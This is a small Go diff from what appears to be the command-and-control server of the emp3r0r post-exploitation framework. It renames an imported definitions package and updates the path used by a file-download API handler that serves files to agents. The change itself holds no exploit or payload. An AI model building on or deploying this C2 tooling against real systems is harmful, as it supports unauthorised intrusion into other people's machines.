@@ -6,8 +6,8 @@ import (
 
 	"github.com/gorilla/mux"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/runtime_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/internal/logging"
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
@@ -70,7 +70,7 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 		}
 		path := util.FileBaseName(req.URL.Query().Get("file_to_download"))
 		logging.Debugf("FileAPI request for file: %s, URL: %s", path, req.URL)
-		local_path := def.Temp + tun.WWW + "/" + path
+		local_path := runtime_def.Temp + tun.WWW + "/" + path
 		if !util.IsExist(local_path) {
 			wrt.WriteHeader(http.StatusNotFound)
 			return
